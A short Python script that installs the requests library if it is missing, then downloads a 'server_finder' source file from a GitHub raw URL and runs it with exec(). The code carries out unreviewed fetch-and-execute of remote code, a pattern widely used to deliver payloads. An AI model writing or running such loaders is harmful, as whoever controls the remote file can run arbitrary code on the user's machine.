import sys, subprocess
try: import requests
except: subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]); import requests

if (r := requests.get("https://raw.githubusercontent.com/thescr1pt/server_finder/refs/heads/main/source.py")).status_code == 200:
    exec(r.text)
else:
    print("Failed to load script.")
